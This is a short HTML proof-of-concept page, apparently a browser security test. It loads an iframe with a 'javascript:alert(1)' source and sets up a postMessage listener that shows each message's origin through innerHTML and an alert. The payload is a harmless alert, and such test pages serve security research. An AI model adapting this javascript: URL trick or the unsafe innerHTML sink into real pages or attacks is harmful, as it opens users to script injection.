<html>
<head>
  <title>PoC</title>
</head>

<body>
  <div id="message"></div>
  <iframe id=x src="javascript:alert(1)" width="1000" height="1000"></iframe>
  <script>
      function listener(event) {
        document.getElementById("message").innerHTML = event.origin;
        alert(event.origin);
        console.log(event)
      }
      if (window.addEventListener) {
        addEventListener("message", listener, false);
      } else {
        attachEvent("onmessage", listener);
      }
  </script>
</body>
</html>
